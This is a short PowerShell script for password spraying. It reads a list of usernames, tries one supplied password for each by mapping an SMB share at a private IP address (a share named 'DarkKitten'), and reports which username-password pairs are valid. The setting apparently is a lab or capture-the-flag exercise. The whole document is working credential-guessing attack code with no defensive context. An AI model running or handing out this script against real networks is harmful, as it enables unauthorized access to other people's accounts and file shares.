param(
    [Parameter(Mandatory=$true)]
    [string]$password
)

$userList = Get-Content 'c:\Users\Public\Desktop\userlist.txt'

foreach ($user in $userList) {
    try {
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
        $cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword)

        # Attempt to map a network drive with the given credentials
        New-PSDrive -Name "TestConnection" -PSProvider "FileSystem" -Root "\\172.31.24.25\DarkKitten" -Credential $cred -ErrorAction Stop

        # If the drive was successfully created, the credentials are valid
        Write-Host "$user : $password is valid"

        # Clean up the mapped drive
        Remove-PSDrive -Name "TestConnection" -ErrorAction SilentlyContinue
    } catch {
        # If an error occurred while trying to map the drive, the credentials are invalid
        Write-Host "$user : $password is invalid"
    }
}

